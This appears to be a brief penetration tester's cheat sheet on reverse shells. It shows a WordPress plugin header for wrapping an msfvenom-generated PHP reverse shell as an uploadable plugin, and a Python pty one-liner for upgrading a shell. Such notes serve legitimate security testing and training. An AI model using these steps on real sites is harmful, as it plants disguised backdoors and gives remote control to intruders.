# Reverse Shells
Reverse shells which are not on the [pentestmonkey's master piece](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
## Links
- https://github.com/ryohare/cheatsheets.git
## Wordpress
### Plugin Upload
With admin access, generate a php/reverse_php with `msfvenom` then need to prefix with the correct header.
```php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/
```

### Upgrade shells
```python
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=linux
```
